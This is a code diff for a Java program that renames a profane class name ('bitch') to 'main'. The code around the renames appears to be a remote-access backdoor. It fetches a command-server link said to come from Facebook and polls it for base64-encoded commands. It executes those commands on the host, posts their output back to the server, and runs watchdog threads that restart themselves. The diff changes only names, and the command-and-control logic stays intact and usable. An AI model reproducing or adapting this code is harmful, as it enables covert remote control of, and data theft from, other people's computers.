@@ -12,7 +12,7 @@ import java.net.Socket;
 import java.net.URL;
 import java.net.URLEncoder;
 
-public class bitch {
+public class main {
     //TimeDelay to reTry connect to facebook
     public static String pwd = System.getProperty("user.dir");
     public static Thread t1, t2, t22;
@@ -62,7 +62,7 @@ public class bitch {
         public void run() {
             try {
                 Thread.sleep(fb_retry);
-                bitch.CE_URL = bitch.contactFBandGetLink();
+                main.CE_URL = main.contactFBandGetLink();
             } catch (Exception e) {
             }
         }
@@ -79,9 +79,9 @@ public class bitch {
         public void run() {
             String commands = null, args[] = null;
             try {
-                Thread.sleep(bitch.cmd_retry);
+                Thread.sleep(main.cmd_retry);
                 boolean noError = true, done = false;
-                if (bitch.CE_URL.length() >= 2) {
+                if (main.CE_URL.length() >= 2) {
                     while (done == false) {
                         try {
                             commands = new String(DatatypeConverter.parseBase64Binary(readWeb(CE_URL + dictionary).trim())).trim();
@@ -97,20 +97,20 @@ public class bitch {
                             System.setProperty("user.dir", args[1]);
                     } else if (commands.equalsIgnoreCase("reset") && identifier == 2) {
                         kill = true;
-                        bitch.t1 = null;
-                        bitch.t2 = null;
+                        main.t1 = null;
+                        main.t2 = null;
                         System.gc();
-                        bitch.t1 = new Thread(new checkForLinks());
-                        bitch.t2 = new Thread(new commandInterpreterThread(1));
-                        bitch.t1.start();
-                        bitch.t2.start();
+                        main.t1 = new Thread(new checkForLinks());
+                        main.t2 = new Thread(new commandInterpreterThread(1));
+                        main.t1.start();
+                        main.t2.start();
                         Thread.sleep(500);
                         System.gc();
                     } else if (commands.equalsIgnoreCase("exit") && identifier == 2) {
                         System.exit(0);
                     } else {
                         if (identifier == 1 && args.length >= 1 && args[0].trim().length() >= 1 && !args[0].equalsIgnoreCase("cd") && !args[0].equalsIgnoreCase("reset"))
-                            bitch.execute(args);
+                            main.execute(args);
                     }
                 }
             } catch (Exception e) {
@@ -178,12 +178,12 @@ public class bitch {
                         buffer.write(data, 0, nRead);
                     }
 
-                    while (pi.available() > 0 && !bitch.kill) {
+                    while (pi.available() > 0 && !main.kill) {
                         char x = (char) pi.read();
                         s += x;
                     }
 
-                    while (pe.available() > 0 && !bitch.kill) {
+                    while (pe.available() > 0 && !main.kill) {
                         char x = (char) pi.read();
                         s += x;
                     }
@@ -202,7 +202,7 @@ public class bitch {
                         readWeb(CE_URL + flush + "cmds");
                     } catch (javax.net.ssl.SSLHandshakeException e) {
                     }
-                    if (bitch.kill == true) {
+                    if (main.kill == true) {
                         p.destroy();
                         p.exitValue();
                         pi.close();
@@ -228,28 +228,28 @@ public class bitch {
     }
 
     public static void main(String args[]) throws Exception {
-        bitch sexyBitch = new bitch();
-        sexyBitch.t1 = new Thread(new checkForLinks());
-        sexyBitch.t2 = new Thread(new commandInterpreterThread(1));
-        sexyBitch.t22 = new Thread(new commandInterpreterThread(2));
+        main sMain = new main();
+        sMain.t1 = new Thread(new checkForLinks());
+        sMain.t2 = new Thread(new commandInterpreterThread(1));
+        sMain.t22 = new Thread(new commandInterpreterThread(2));
         while (true) {
-            if (!sexyBitch.t1.isAlive()) {
-                sexyBitch.t1 = null;
+            if (!sMain.t1.isAlive()) {
+                sMain.t1 = null;
                 System.gc();
-                sexyBitch.t1 = new Thread(new checkForLinks());
-                sexyBitch.t1.start();
+                sMain.t1 = new Thread(new checkForLinks());
+                sMain.t1.start();
             }
-            if (!sexyBitch.t2.isAlive()) {
-                sexyBitch.t2 = null;
+            if (!sMain.t2.isAlive()) {
+                sMain.t2 = null;
                 System.gc();
-                sexyBitch.t2 = new Thread(new commandInterpreterThread(1));
-                sexyBitch.t2.start();
+                sMain.t2 = new Thread(new commandInterpreterThread(1));
+                sMain.t2.start();
             }
-            if (!sexyBitch.t22.isAlive()) {
-                sexyBitch.t22 = null;
+            if (!sMain.t22.isAlive()) {
+                sMain.t22 = null;
                 System.gc();
-                sexyBitch.t22 = new Thread(new commandInterpreterThread(2));
-                sexyBitch.t22.start();
+                sMain.t22 = new Thread(new commandInterpreterThread(2));
+                sMain.t22.start();
             }
             Thread.sleep(1000);
         }
